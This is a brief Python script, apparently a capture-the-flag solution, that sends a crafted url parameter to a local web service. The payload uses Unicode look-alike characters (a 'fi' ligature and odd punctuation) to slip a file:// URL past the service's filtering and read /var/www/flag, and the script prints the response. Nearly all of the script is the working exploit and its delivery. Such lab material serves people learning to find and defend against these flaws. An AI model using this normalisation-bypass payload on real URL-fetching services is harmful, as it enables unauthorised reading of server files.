import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 31415))

URL = f"http://{HOST}:{PORT}"

payload = "ﬁle:///var/www/flag⁇.aaaaaaaaaaaaaaaaaaaaa˛"

print(f"R{requests.get(f'{URL}?url={payload}').text}")